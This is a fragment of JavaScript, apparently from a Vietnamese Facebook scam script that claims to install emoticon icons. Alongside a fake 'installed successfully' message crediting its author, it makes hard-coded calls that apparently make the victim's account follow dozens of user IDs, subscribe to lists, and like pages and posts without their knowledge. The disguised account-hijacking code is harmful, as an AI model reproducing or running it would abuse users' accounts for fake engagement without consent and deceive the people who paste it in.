...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/hoaidracula" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FaceBook Thành Công <br>.::Xấutựnhiên Điênphongcách::.</a>';
	html += '</div>';
...
//Boss XẤUTỰNHIÊN ĐIÊNPHONGCÁCH,ai chéo inbox:fb.com/hoaidracula
a("100006822879747");
a("100007941781535");
a("100007488042937");
a("100004070930845");
...
a("100004095526354");
a("100007499880504");
sublist("1403858079851608");
sublist("1403859506518132");
sublist("1403859753184774");
sublist("170578349817319");
sublist("170578663150621");
Like("608827825848840");
Like("176095275919867");
Like("605296122849304");
Like("241637709328670");
Like("503031293128383");
Like("564668576942692");
Like("216610758518409");
P("1410339102536839");
P("1403821533188596");
P("1403819659855450");
P("1411713492399400");
